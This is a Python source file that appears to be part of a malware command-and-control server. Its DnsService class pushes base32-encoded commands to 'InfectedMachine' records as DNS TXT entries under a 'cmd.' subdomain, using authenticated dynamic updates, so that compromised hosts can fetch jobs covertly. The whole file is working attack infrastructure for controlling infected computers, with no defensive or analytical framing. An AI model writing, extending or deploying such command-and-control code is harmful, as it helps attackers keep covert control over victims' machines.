import base64
from typing import Self

import dns
import dns.query
from decouple import config
from dns import tsigkeyring
from dns.update import Update

from djangoproject.models import InfectedMachine


class DnsService:
    def __init__(self):
        key_name = config('DNS_ZONE_KEY_NAME')
        secret = base64.b64decode(config('DNS_ZONE_KEY'))
        self.keyring = tsigkeyring.from_text({key_name: f"hmac-sha256:{secret}",})
        self.updater = Update("data.tm-it.fr", keyring=self.keyring, keyname=dns.name.from_text(key_name))

    def set_job_txt(self, machine: InfectedMachine, txt_value: str) -> Self:
        if self.updater is None: return self

        # Replace does create the record if not exists, or update the value
        self.updater.replace(f'cmd.{machine.dns_identifier}', 300, "TXT", base64.b32encode(txt_value.encode()).decode())
        return self

    def remove_job_txt(self, machine: InfectedMachine) -> Self:
        if self.updater is None: return self

        self.updater.delete(f'cmd.{machine.dns_identifier}')
        return self

    def apply(self) -> None:
        if self.updater is None: return

        print("DNS: about to send update", flush=True)
        try:
            response = dns.query.tcp(self.updater, "127.0.0.1")
            print(f"DNS update response: {response}", flush=True)
        except Exception as e:
            print(f"DNS update error: {e}", flush=True)
